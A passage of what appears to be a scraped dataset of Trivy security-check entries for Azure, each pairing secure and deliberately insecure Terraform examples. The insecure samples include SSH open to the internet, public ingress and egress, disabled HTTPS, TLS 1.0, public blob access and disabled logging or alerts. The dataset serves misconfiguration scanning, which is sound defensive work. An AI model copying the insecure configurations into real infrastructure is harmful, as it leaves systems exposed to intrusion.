        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_security_rule\n  good:\n    - |-\n      resource \"azurerm_network_security_rule\" \"good_example\" {\n        direction                  = \"Outbound\"\n        destination_address_prefix = \"10.0.0.0/16\"\n        access                     = \"Allow\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_network_security_rule\" \"bad_example\" {\n        direction                  = \"Outbound\"\n        destination_address_prefix = \"0.0.0.0/0\"\n        access                     = \"Allow\"\n      }\n",
        "file_name": "no_public_egress.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/network/no_public_egress.yaml",
        "local_path": "azure/network/no_public_egress.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_security_rule"
            ],
            "good": [
              "resource \"azurerm_network_security_rule\" \"good_example\" {\n  direction                  = \"Outbound\"\n  destination_address_prefix = \"10.0.0.0/16\"\n  access                     = \"Allow\"\n}"
            ],
            "bad": [
              "resource \"azurerm_network_security_rule\" \"bad_example\" {\n  direction                  = \"Outbound\"\n  destination_address_prefix = \"0.0.0.0/0\"\n  access                     = \"Allow\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-NETWORK-NO_PUBLIC_INGRESS",
        "title": "No Public Ingress",
        "provider": "azure",
        "service": "network",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_security_rule\n  good:\n    - |-\n      resource \"azurerm_network_security_rule\" \"good_example\" {\n        direction                  = \"Inbound\"\n        destination_address_prefix = \"10.0.0.0/16\"\n        access                     = \"Allow\"\n      }\n    - |-\n      resource \"azurerm_network_security_rule\" \"allow_lb_prober\" {\n        direction               = \"Inbound\"\n        access                  = \"Allow\"\n        protocol                = \"Tcp\" # Probes are always TCP\n        source_port_range       = \"*\"\n        destination_port_ranges = \"443\"\n        source_address_prefix   = \"168.63.129.16\" // single public IP (Azure well known)\n      }\n  bad:\n    - |-\n      resource \"azurerm_network_security_rule\" \"bad_example\" {\n        direction             = \"Inbound\"\n        source_address_prefix = \"0.0.0.0/0\"\n        access                = \"Allow\"\n      }\n",
        "file_name": "no_public_ingress.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/network/no_public_ingress.yaml",
        "local_path": "azure/network/no_public_ingress.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_security_rule"
            ],
            "good": [
              "resource \"azurerm_network_security_rule\" \"good_example\" {\n  direction                  = \"Inbound\"\n  destination_address_prefix = \"10.0.0.0/16\"\n  access                     = \"Allow\"\n}",
              "resource \"azurerm_network_security_rule\" \"allow_lb_prober\" {\n  direction               = \"Inbound\"\n  access                  = \"Allow\"\n  protocol                = \"Tcp\" # Probes are always TCP\n  source_port_range       = \"*\"\n  destination_port_ranges = \"443\"\n  source_address_prefix   = \"168.63.129.16\" // single public IP (Azure well known)\n}"
            ],
            "bad": [
              "resource \"azurerm_network_security_rule\" \"bad_example\" {\n  direction             = \"Inbound\"\n  source_address_prefix = \"0.0.0.0/0\"\n  access                = \"Allow\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-NETWORK-RETENTION_POLICY_SET",
        "title": "Retention Policy Set",
        "provider": "azure",
        "service": "network",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_watcher_flow_log#retention_policy\n  good:\n    - |-\n      resource \"azurerm_network_watcher_flow_log\" \"good_watcher\" {\n        network_watcher_name = \"good_watcher\"\n        resource_group_name  = \"resource-group\"\n\n        network_security_group_id = azurerm_network_security_group.test.id\n        storage_account_id        = azurerm_storage_account.test.id\n        enabled                   = true\n\n        retention_policy {\n          enabled = true\n          days    = 90\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_network_watcher_flow_log\" \"bad_watcher\" {\n        network_watcher_name = \"bad_watcher\"\n        resource_group_name  = \"resource-group\"\n\n        network_security_group_id = azurerm_network_security_group.test.id\n        storage_account_id        = azurerm_storage_account.test.id\n        enabled                   = true\n\n        retention_policy {\n          enabled = false\n          days    = 7\n        }\n      }\n    - |-\n      resource \"azurerm_network_watcher_flow_log\" \"bad_watcher\" {\n        network_watcher_name = \"bad_watcher\"\n        resource_group_name  = \"resource-group\"\n\n        network_security_group_id = azurerm_network_security_group.test.id\n        storage_account_id        = azurerm_storage_account.test.id\n        enabled                   = true\n\n        retention_policy {\n          enabled = true\n          days    = 7\n        }\n      }\n",
        "file_name": "retention_policy_set.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/network/retention_policy_set.yaml",
        "local_path": "azure/network/retention_policy_set.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_watcher_flow_log#retention_policy"
            ],
            "good": [
              "resource \"azurerm_network_watcher_flow_log\" \"good_watcher\" {\n  network_watcher_name = \"good_watcher\"\n  resource_group_name  = \"resource-group\"\n\n  network_security_group_id = azurerm_network_security_group.test.id\n  storage_account_id        = azurerm_storage_account.test.id\n  enabled                   = true\n\n  retention_policy {\n    enabled = true\n    days    = 90\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_network_watcher_flow_log\" \"bad_watcher\" {\n  network_watcher_name = \"bad_watcher\"\n  resource_group_name  = \"resource-group\"\n\n  network_security_group_id = azurerm_network_security_group.test.id\n  storage_account_id        = azurerm_storage_account.test.id\n  enabled                   = true\n\n  retention_policy {\n    enabled = false\n    days    = 7\n  }\n}",
              "resource \"azurerm_network_watcher_flow_log\" \"bad_watcher\" {\n  network_watcher_name = \"bad_watcher\"\n  resource_group_name  = \"resource-group\"\n\n  network_security_group_id = azurerm_network_security_group.test.id\n  storage_account_id        = azurerm_storage_account.test.id\n  enabled                   = true\n\n  retention_policy {\n    enabled = true\n    days    = 7\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-NETWORK-SSH_BLOCKED_FROM_INTERNET",
        "title": "Ssh Blocked From Internet",
        "provider": "azure",
        "service": "network",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/data-sources/network_security_group#security_rule\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_security_rule#source_port_ranges\n  good:\n    - |-\n      resource \"azurerm_network_security_rule\" \"good_example\" {\n        name                       = \"good_example_security_rule\"\n        direction                  = \"Inbound\"\n        access                     = \"Allow\"\n        protocol                   = \"TCP\"\n        source_port_range          = \"*\"\n        destination_port_range     = \"22\"\n        source_address_prefix      = \"82.102.23.23\" # specific address\n        destination_address_prefix = \"*\"\n      }\n    - |-\n      resource \"azurerm_network_security_rule\" \"good_example\" {\n        name                       = \"good_example_security_rule\"\n        direction                  = \"Inbound\"\n        access                     = \"Allow\"\n        protocol                   = \"ICMP\" # icmp\n        source_port_range          = \"*\"\n        destination_port_range     = \"22\"\n        source_address_prefix      = \"*\"\n        destination_address_prefix = \"*\"\n      }\n    - |-\n      resource \"azurerm_network_security_rule\" \"good_example\" {\n        name                       = \"good_example_security_rule\"\n        direction                  = \"Inbound\"\n        access                     = \"Allow\"\n        protocol                   = \"TCP\"\n        source_port_range          = \"*\"\n        destination_port_range     = \"8080\" # not ssh\n        source_address_prefix      = \"*\"\n        destination_address_prefix = \"*\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_network_security_rule\" \"bad_example\" {\n        name                       = \"bad_example_security_rule\"\n        direction                  = \"Inbound\"\n        access                     = \"Allow\"\n        protocol                   = \"TCP\"\n        source_port_range          = \"*\"\n        destination_port_range     = \"22\"\n        source_address_prefix      = \"*\"\n        destination_address_prefix = \"*\"\n      }\n",
        "file_name": "ssh_blocked_from_internet.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/network/ssh_blocked_from_internet.yaml",
        "local_path": "azure/network/ssh_blocked_from_internet.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/data-sources/network_security_group#security_rule",
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_security_rule#source_port_ranges"
            ],
            "good": [
              "resource \"azurerm_network_security_rule\" \"good_example\" {\n  name                       = \"good_example_security_rule\"\n  direction                  = \"Inbound\"\n  access                     = \"Allow\"\n  protocol                   = \"TCP\"\n  source_port_range          = \"*\"\n  destination_port_range     = \"22\"\n  source_address_prefix      = \"82.102.23.23\" # specific address\n  destination_address_prefix = \"*\"\n}",
              "resource \"azurerm_network_security_rule\" \"good_example\" {\n  name                       = \"good_example_security_rule\"\n  direction                  = \"Inbound\"\n  access                     = \"Allow\"\n  protocol                   = \"ICMP\" # icmp\n  source_port_range          = \"*\"\n  destination_port_range     = \"22\"\n  source_address_prefix      = \"*\"\n  destination_address_prefix = \"*\"\n}",
              "resource \"azurerm_network_security_rule\" \"good_example\" {\n  name                       = \"good_example_security_rule\"\n  direction                  = \"Inbound\"\n  access                     = \"Allow\"\n  protocol                   = \"TCP\"\n  source_port_range          = \"*\"\n  destination_port_range     = \"8080\" # not ssh\n  source_address_prefix      = \"*\"\n  destination_address_prefix = \"*\"\n}"
            ],
            "bad": [
              "resource \"azurerm_network_security_rule\" \"bad_example\" {\n  name                       = \"bad_example_security_rule\"\n  direction                  = \"Inbound\"\n  access                     = \"Allow\"\n  protocol                   = \"TCP\"\n  source_port_range          = \"*\"\n  destination_port_range     = \"22\"\n  source_address_prefix      = \"*\"\n  destination_address_prefix = \"*\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-SECURITYCENTER-ALERT_ON_SEVERE_NOTIFICATIONS",
        "title": "Alert On Severe Notifications",
        "provider": "azure",
        "service": "securitycenter",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/security_center_contact#alert_notifications\n  good:\n    - |-\n      resource \"azurerm_security_center_contact\" \"good_example\" {\n        email = \"good_example@example.com\"\n        phone = \"+1-555-555-5555\"\n\n        alert_notifications = true\n        alerts_to_admins    = true\n      }\n  bad:\n    - |-\n      resource \"azurerm_security_center_contact\" \"bad_example\" {\n        email = \"bad_example@example.com\"\n        phone = \"+1-555-555-5555\"\n\n        alert_notifications = false\n        alerts_to_admins    = false\n      }\n",
        "file_name": "alert_on_severe_notifications.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/securitycenter/alert_on_severe_notifications.yaml",
        "local_path": "azure/securitycenter/alert_on_severe_notifications.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/security_center_contact#alert_notifications"
            ],
            "good": [
              "resource \"azurerm_security_center_contact\" \"good_example\" {\n  email = \"good_example@example.com\"\n  phone = \"+1-555-555-5555\"\n\n  alert_notifications = true\n  alerts_to_admins    = true\n}"
            ],
            "bad": [
              "resource \"azurerm_security_center_contact\" \"bad_example\" {\n  email = \"bad_example@example.com\"\n  phone = \"+1-555-555-5555\"\n\n  alert_notifications = false\n  alerts_to_admins    = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-SECURITYCENTER-ENABLE_STANDARD_SUBSCRIPTION",
        "title": "Enable Standard Subscription",
        "provider": "azure",
        "service": "securitycenter",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/security_center_subscription_pricing#tier\n  good:\n    - |-\n      resource \"azurerm_security_center_subscription_pricing\" \"good_example\" {\n        tier          = \"Standard\"\n        resource_type = \"VirtualMachines\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_security_center_subscription_pricing\" \"bad_example\" {\n        tier          = \"Free\"\n        resource_type = \"VirtualMachines\"\n      }\n",
        "file_name": "enable_standard_subscription.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/securitycenter/enable_standard_subscription.yaml",
        "local_path": "azure/securitycenter/enable_standard_subscription.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/security_center_subscription_pricing#tier"
            ],
            "good": [
              "resource \"azurerm_security_center_subscription_pricing\" \"good_example\" {\n  tier          = \"Standard\"\n  resource_type = \"VirtualMachines\"\n}"
            ],
            "bad": [
              "resource \"azurerm_security_center_subscription_pricing\" \"bad_example\" {\n  tier          = \"Free\"\n  resource_type = \"VirtualMachines\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-SECURITYCENTER-SET_REQUIRED_CONTACT_DETAILS",
        "title": "Set Required Contact Details",
        "provider": "azure",
        "service": "securitycenter",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/security_center_contact#phone\n  good:\n    - |-\n      resource \"azurerm_security_center_contact\" \"good_example\" {\n        email = \"good_contact@example.com\"\n        phone = \"+1-555-555-5555\"\n\n        alert_notifications = true\n        alerts_to_admins    = true\n      }\n  bad:\n    - |-\n      resource \"azurerm_security_center_contact\" \"bad_example\" {\n        email = \"bad_contact@example.com\"\n        phone = \"\"\n\n        alert_notifications = true\n        alerts_to_admins    = true\n      }\n",
        "file_name": "set_required_contact_details.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/securitycenter/set_required_contact_details.yaml",
        "local_path": "azure/securitycenter/set_required_contact_details.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/security_center_contact#phone"
            ],
            "good": [
              "resource \"azurerm_security_center_contact\" \"good_example\" {\n  email = \"good_contact@example.com\"\n  phone = \"+1-555-555-5555\"\n\n  alert_notifications = true\n  alerts_to_admins    = true\n}"
            ],
            "bad": [
              "resource \"azurerm_security_center_contact\" \"bad_example\" {\n  email = \"bad_contact@example.com\"\n  phone = \"\"\n\n  alert_notifications = true\n  alerts_to_admins    = true\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-STORAGE-ALLOW_MICROSOFT_SERVICE_BYPASS",
        "title": "Allow Microsoft Service Bypass",
        "provider": "azure",
        "service": "storage",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#bypass\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account_network_rules#bypass\n  good:\n    - |-\n      resource \"azurerm_storage_account\" \"good_example\" {\n        name                = \"storageaccountname\"\n        resource_group_name = azurerm_resource_group.example.name\n\n        location                 = azurerm_resource_group.example.location\n        account_tier             = \"Standard\"\n        account_replication_type = \"LRS\"\n\n        network_rules {\n          default_action = \"Deny\"\n          ip_rules       = [\"100.0.0.1\"]\n          bypass         = [\"Metrics\", \"AzureServices\"]\n        }\n      }\n    - |-\n      resource \"azurerm_storage_account\" \"good_example\" {\n        name                = \"storageaccountname\"\n        resource_group_name = azurerm_resource_group.example.name\n      }\n\n      resource \"azurerm_storage_account_network_rules\" \"test\" {\n        resource_group_name  = azurerm_resource_group.test.name\n        storage_account_name = azurerm_storage_account.good_example.name\n\n        default_action = \"Allow\"\n        ip_rules       = [\"127.0.0.1\"]\n        bypass         = [\"Metrics\", \"AzureServices\"]\n      }\n  bad:\n    - |-\n      resource \"azurerm_storage_account\" \"bad_example\" {\n        name                = \"storageaccountname\"\n        resource_group_name = azurerm_resource_group.example.name\n\n        location                 = azurerm_resource_group.example.location\n        account_tier             = \"Standard\"\n        account_replication_type = \"LRS\"\n\n        network_rules {\n          default_action = \"Deny\"\n          ip_rules       = [\"100.0.0.1\"]\n          bypass         = [\"Metrics\"]\n        }\n      }\n    - |-\n      resource \"azurerm_storage_account\" \"bad_example\" {\n        name                = \"storageaccountname\"\n        resource_group_name = azurerm_resource_group.example.name\n      }\n\n      resource \"azurerm_storage_account_network_rules\" \"test\" {\n        resource_group_name  = azurerm_resource_group.test.name\n        storage_account_name = azurerm_storage_account.bad_example.name\n\n        default_action = \"Allow\"\n        ip_rules       = [\"127.0.0.1\"]\n        bypass         = [\"Metrics\"]\n      }\n",
        "file_name": "allow_microsoft_service_bypass.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/storage/allow_microsoft_service_bypass.yaml",
        "local_path": "azure/storage/allow_microsoft_service_bypass.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#bypass",
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account_network_rules#bypass"
            ],
            "good": [
              "resource \"azurerm_storage_account\" \"good_example\" {\n  name                = \"storageaccountname\"\n  resource_group_name = azurerm_resource_group.example.name\n\n  location                 = azurerm_resource_group.example.location\n  account_tier             = \"Standard\"\n  account_replication_type = \"LRS\"\n\n  network_rules {\n    default_action = \"Deny\"\n    ip_rules       = [\"100.0.0.1\"]\n    bypass         = [\"Metrics\", \"AzureServices\"]\n  }\n}",
              "resource \"azurerm_storage_account\" \"good_example\" {\n  name                = \"storageaccountname\"\n  resource_group_name = azurerm_resource_group.example.name\n}\n\nresource \"azurerm_storage_account_network_rules\" \"test\" {\n  resource_group_name  = azurerm_resource_group.test.name\n  storage_account_name = azurerm_storage_account.good_example.name\n\n  default_action = \"Allow\"\n  ip_rules       = [\"127.0.0.1\"]\n  bypass         = [\"Metrics\", \"AzureServices\"]\n}"
            ],
            "bad": [
              "resource \"azurerm_storage_account\" \"bad_example\" {\n  name                = \"storageaccountname\"\n  resource_group_name = azurerm_resource_group.example.name\n\n  location                 = azurerm_resource_group.example.location\n  account_tier             = \"Standard\"\n  account_replication_type = \"LRS\"\n\n  network_rules {\n    default_action = \"Deny\"\n    ip_rules       = [\"100.0.0.1\"]\n    bypass         = [\"Metrics\"]\n  }\n}",
              "resource \"azurerm_storage_account\" \"bad_example\" {\n  name                = \"storageaccountname\"\n  resource_group_name = azurerm_resource_group.example.name\n}\n\nresource \"azurerm_storage_account_network_rules\" \"test\" {\n  resource_group_name  = azurerm_resource_group.test.name\n  storage_account_name = azurerm_storage_account.bad_example.name\n\n  default_action = \"Allow\"\n  ip_rules       = [\"127.0.0.1\"]\n  bypass         = [\"Metrics\"]\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-STORAGE-DEFAULT_ACTION_DENY",
        "title": "Default Action Deny",
        "provider": "azure",
        "service": "storage",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account_network_rules#default_action\n  good:\n    - |-\n      resource \"azurerm_storage_account_network_rules\" \"good_example\" {\n\n        default_action             = \"Deny\"\n        ip_rules                   = [\"127.0.0.1\"]\n        virtual_network_subnet_ids = [azurerm_subnet.test.id]\n        bypass                     = [\"Metrics\"]\n      }\n  bad:\n    - |-\n      resource \"azurerm_storage_account_network_rules\" \"bad_example\" {\n\n        default_action             = \"Allow\"\n        ip_rules                   = [\"127.0.0.1\"]\n        virtual_network_subnet_ids = [azurerm_subnet.test.id]\n        bypass                     = [\"Metrics\"]\n      }\n",
        "file_name": "default_action_deny.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/storage/default_action_deny.yaml",
        "local_path": "azure/storage/default_action_deny.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account_network_rules#default_action"
            ],
            "good": [
              "resource \"azurerm_storage_account_network_rules\" \"good_example\" {\n\n  default_action             = \"Deny\"\n  ip_rules                   = [\"127.0.0.1\"]\n  virtual_network_subnet_ids = [azurerm_subnet.test.id]\n  bypass                     = [\"Metrics\"]\n}"
            ],
            "bad": [
              "resource \"azurerm_storage_account_network_rules\" \"bad_example\" {\n\n  default_action             = \"Allow\"\n  ip_rules                   = [\"127.0.0.1\"]\n  virtual_network_subnet_ids = [azurerm_subnet.test.id]\n  bypass                     = [\"Metrics\"]\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-STORAGE-ENFORCE_HTTPS",
        "title": "Enforce Https",
        "provider": "azure",
        "service": "storage",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#enable_https_traffic_only\n  good:\n    - |-\n      resource \"azurerm_storage_account\" \"good_example\" {\n        name                      = \"storageaccountname\"\n        resource_group_name       = azurerm_resource_group.example.name\n        location                  = azurerm_resource_group.example.location\n        account_tier              = \"Standard\"\n        account_replication_type  = \"GRS\"\n        enable_https_traffic_only = true\n      }\n  bad:\n    - |-\n      resource \"azurerm_storage_account\" \"bad_example\" {\n        name                      = \"storageaccountname\"\n        resource_group_name       = azurerm_resource_group.example.name\n        location                  = azurerm_resource_group.example.location\n        account_tier              = \"Standard\"\n        account_replication_type  = \"GRS\"\n        enable_https_traffic_only = false\n      }\n",
        "file_name": "enforce_https.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/storage/enforce_https.yaml",
        "local_path": "azure/storage/enforce_https.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#enable_https_traffic_only"
            ],
            "good": [
              "resource \"azurerm_storage_account\" \"good_example\" {\n  name                      = \"storageaccountname\"\n  resource_group_name       = azurerm_resource_group.example.name\n  location                  = azurerm_resource_group.example.location\n  account_tier              = \"Standard\"\n  account_replication_type  = \"GRS\"\n  enable_https_traffic_only = true\n}"
            ],
            "bad": [
              "resource \"azurerm_storage_account\" \"bad_example\" {\n  name                      = \"storageaccountname\"\n  resource_group_name       = azurerm_resource_group.example.name\n  location                  = azurerm_resource_group.example.location\n  account_tier              = \"Standard\"\n  account_replication_type  = \"GRS\"\n  enable_https_traffic_only = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-STORAGE-NO_PUBLIC_ACCESS",
        "title": "No Public Access",
        "provider": "azure",
        "service": "storage",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://www.terraform.io/docs/providers/azure/r/storage_container.html#properties\n  good:\n    - |-\n      resource \"azurerm_storage_container\" \"good_example\" {\n        name                  = \"terraform-container-storage\"\n        container_access_type = \"private\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_storage_container\" \"bad_example\" {\n        name                  = \"terraform-container-storage\"\n        container_access_type = \"blob\"\n      }\n",
        "file_name": "no_public_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/storage/no_public_access.yaml",
        "local_path": "azure/storage/no_public_access.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://www.terraform.io/docs/providers/azure/r/storage_container.html#properties"
            ],
            "good": [
              "resource \"azurerm_storage_container\" \"good_example\" {\n  name                  = \"terraform-container-storage\"\n  container_access_type = \"private\"\n}"
            ],
            "bad": [
              "resource \"azurerm_storage_container\" \"bad_example\" {\n  name                  = \"terraform-container-storage\"\n  container_access_type = \"blob\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-STORAGE-QUEUE_SERVICES_LOGGING_ENABLED",
        "title": "Queue Services Logging Enabled",
        "provider": "azure",
        "service": "storage",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#logging\n  good:\n    - |-\n      resource \"azurerm_storage_account\" \"good_example\" {\n        name                     = \"example\"\n        resource_group_name      = data.azurerm_resource_group.example.name\n        location                 = data.azurerm_resource_group.example.location\n        account_tier             = \"Standard\"\n        account_replication_type = \"GRS\"\n        queue_properties {\n          logging {\n            delete                = true\n            read                  = true\n            write                 = true\n            version               = \"1.0\"\n            retention_policy_days = 10\n          }\n        }\n      }\n\n      resource \"azurerm_storage_queue\" \"good_example\" {\n        name                 = \"my-queue\"\n        storage_account_name = azurerm_storage_account.good_example.name\n      }\n  bad:\n    - |-\n      resource \"azurerm_storage_account\" \"bad_example\" {\n        name                     = \"example\"\n        resource_group_name      = data.azurerm_resource_group.example.name\n        location                 = data.azurerm_resource_group.example.location\n        account_tier             = \"Standard\"\n        account_replication_type = \"GRS\"\n        queue_properties {\n        }\n      }\n\n      resource \"azurerm_storage_queue\" \"bad_example\" {\n        name                 = \"my-queue\"\n        storage_account_name = azurerm_storage_account.bad_example.name\n      }\n",
        "file_name": "queue_services_logging_enabled.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/storage/queue_services_logging_enabled.yaml",
        "local_path": "azure/storage/queue_services_logging_enabled.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#logging"
            ],
            "good": [
              "resource \"azurerm_storage_account\" \"good_example\" {\n  name                     = \"example\"\n  resource_group_name      = data.azurerm_resource_group.example.name\n  location                 = data.azurerm_resource_group.example.location\n  account_tier             = \"Standard\"\n  account_replication_type = \"GRS\"\n  queue_properties {\n    logging {\n      delete                = true\n      read                  = true\n      write                 = true\n      version               = \"1.0\"\n      retention_policy_days = 10\n    }\n  }\n}\n\nresource \"azurerm_storage_queue\" \"good_example\" {\n  name                 = \"my-queue\"\n  storage_account_name = azurerm_storage_account.good_example.name\n}"
            ],
            "bad": [
              "resource \"azurerm_storage_account\" \"bad_example\" {\n  name                     = \"example\"\n  resource_group_name      = data.azurerm_resource_group.example.name\n  location                 = data.azurerm_resource_group.example.location\n  account_tier             = \"Standard\"\n  account_replication_type = \"GRS\"\n  queue_properties {\n  }\n}\n\nresource \"azurerm_storage_queue\" \"bad_example\" {\n  name                 = \"my-queue\"\n  storage_account_name = azurerm_storage_account.bad_example.name\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-STORAGE-USE_SECURE_TLS_POLICY",
        "title": "Use Secure Tls Policy",
        "provider": "azure",
        "service": "storage",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#min_tls_version\n  good:\n    - |-\n      resource \"azurerm_storage_account\" \"good_example\" {\n        name                = \"storageaccountname\"\n        resource_group_name = azurerm_resource_group.example.name\n        location            = azurerm_resource_group.example.location\n        min_tls_version     = \"TLS1_2\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_storage_account\" \"bad_example\" {\n        name                = \"storageaccountname\"\n        resource_group_name = azurerm_resource_group.example.name\n        location            = azurerm_resource_group.example.location\n        min_tls_version     = \"TLS1_0\"\n      }\n",
        "file_name": "use_secure_tls_policy.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/storage/use_secure_tls_policy.yaml",
        "local_path": "azure/storage/use_secure_tls_policy.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#min_tls_version"
            ],
            "good": [
              "resource \"azurerm_storage_account\" \"good_example\" {\n  name                = \"storageaccountname\"\n  resource_group_name = azurerm_resource_group.example.name\n  location            = azurerm_resource_group.example.location\n  min_tls_version     = \"TLS1_2\"\n}"
            ],
            "bad": [
              "resource \"azurerm_storage_account\" \"bad_example\" {\n  name                = \"storageaccountname\"\n  resource_group_name = azurerm_resource_group.example.name\n  location            = azurerm_resource_group.example.location\n  min_tls_version     = \"TLS1_0\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-SYNAPSE-VIRTUAL_NETWORK_ENABLED",
        "title": "Virtual Network Enabled",
        "provider": "azure",
        "service": "synapse",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/synapse_workspace#managed_virtual_network_enabled\n  good:\n    - |-\n      resource \"azurerm_synapse_workspace\" \"good_example\" {\n        name                                 = \"example\"\n        resource_group_name                  = azurerm_resource_group.example.name\n        location                             = azurerm_resource_group.example.location\n        storage_data_lake_gen2_filesystem_id = azurerm_storage_data_lake_gen2_filesystem.example.id\n        managed_virtual_network_enabled      = true\n      }\n  bad:\n    - |-\n      resource \"azurerm_synapse_workspace\" \"bad_example\" {\n        name                                 = \"example\"\n        resource_group_name                  = azurerm_resource_group.example.name\n        location                             = azurerm_resource_group.example.location\n        storage_data_lake_gen2_filesystem_id = azurerm_storage_data_lake_gen2_filesystem.example.id\n        managed_virtual_network_enabled      = false\n      }\n",
        "file_name": "virtual_network_enabled.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/synapse/virtual_network_enabled.yaml",
        "local_path": "azure/synapse/virtual_network_enabled.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/synapse_workspace#managed_virtual_network_enabled"
            ],
            "good": [
